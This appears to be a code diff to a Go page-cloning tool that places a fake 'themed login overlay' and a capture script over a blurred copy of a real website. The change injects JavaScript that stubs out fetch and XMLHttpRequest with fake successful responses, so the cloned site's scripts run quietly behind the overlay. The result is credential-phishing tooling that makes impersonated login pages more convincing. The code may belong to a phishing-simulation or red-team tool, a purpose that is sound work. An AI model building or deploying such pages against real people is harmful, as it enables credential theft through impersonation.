@@ -53,6 +53,29 @@ const captureScript = `(function(){
   };
 })();`
 
+// networkSilencer is injected as the first child of <head> in overlay mode.
+// It replaces fetch/XHR with silent no-ops so site JS can still handle layout
+// and class toggling without triggering failed API calls or error popups.
+const networkSilencer = `(function(){
+  var noop=function(){};
+  var fakeResp=new Response('{}',{status:200,headers:{'Content-Type':'application/json'}});
+  window.fetch=function(){return Promise.resolve(fakeResp.clone());};
+  var XHR=XMLHttpRequest.prototype;
+  XHR.open=function(){this._csBlock=true;};
+  XHR.send=function(){
+    if(this._csBlock){
+      Object.defineProperty(this,'readyState',{get:function(){return 4;}});
+      Object.defineProperty(this,'status',{get:function(){return 200;}});
+      Object.defineProperty(this,'responseText',{get:function(){return '{}';}});
+      Object.defineProperty(this,'response',{get:function(){return '{}';}});
+      try{this.onreadystatechange&&this.onreadystatechange();}catch(e){}
+      try{this.onload&&this.onload();}catch(e){}
+    }
+  };
+  XHR.setRequestHeader=noop;
+  XHR.abort=noop;
+})();`
+
 const overlayCSS = `
 #cs-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
 #cs-backdrop{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.25);backdrop-filter:blur(1px)}
@@ -85,15 +108,16 @@ func RewriteForms(htmlContent string) (string, error) {
 	return buf.String(), nil
 }
 
-// ApplyOverlay strips all site scripts and injects a themed login overlay
-// on top of the cloned page. The cloned site becomes a blurred backdrop.
+// ApplyOverlay silences site network requests and injects a themed login
+// overlay on top of the cloned page. Site JS still runs (preserving layout)
+// but fetch/XHR calls return empty 200s instead of failing with error popups.
 func ApplyOverlay(htmlContent string) (string, error) {
 	doc, err := html.Parse(strings.NewReader(htmlContent))
 	if err != nil {
 		return "", fmt.Errorf("parse HTML: %w", err)
 	}
 
-	stripScripts(doc)
+	injectNetworkSilencer(doc)
 	injectOverlay(doc)
 
 	var buf bytes.Buffer
@@ -101,6 +125,17 @@ func ApplyOverlay(htmlContent string) (string, error) {
 		return "", fmt.Errorf("render HTML: %w", err)
 	}
 	return buf.String(), nil
+}
+
+// injectNetworkSilencer prepends the network silencer as the first child of <head>.
+func injectNetworkSilencer(doc *html.Node) {
+	head := findNode(doc, "head")
+	if head == nil {
+		return
+	}
+	script := &html.Node{Type: html.ElementNode, Data: "script"}
+	script.AppendChild(&html.Node{Type: html.TextNode, Data: networkSilencer})
+	head.InsertBefore(script, head.FirstChild)
 }
 
 // injectCaptureScript prepends the capture script as the first child of <head>.
